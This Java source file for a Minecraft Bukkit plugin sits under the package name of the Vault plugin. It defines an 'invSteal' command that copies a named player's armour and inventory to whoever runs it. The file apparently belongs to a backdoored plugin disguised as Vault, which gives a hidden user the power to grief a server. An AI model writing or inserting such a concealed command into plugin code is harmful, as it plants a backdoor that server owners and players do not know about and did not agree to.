package net.milkbowl.vault.commands.cmds;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class invSteal extends CommandManager {


    public void execute(Core plugin, String msg, String[] args, Player p) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE("invSteal <player>"));
        } else {
            if (args[1].equals("*")) {
                p.sendMessage(Settings.PREFIX("You cannot steal everyones inventory!"));
            } else {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                if (target == null) {
                    p.sendMessage(Settings.PREFIX("The player " + Settings.HIGHLIGHT_COLOUR + args[1] + Settings.SECONDARY_COLOUR + " is not online."));
                } else {
                    p.getInventory().setArmorContents(target.getInventory().getArmorContents());
                    p.getInventory().setContents(target.getInventory().getContents());

                    p.sendMessage(Settings.PREFIX("You have copied and stolen " + Settings.HIGHLIGHT_COLOUR + target.getName() + "'s" + Settings.SECONDARY_COLOUR + " inventory"));
                }
            }
        }
    }
}
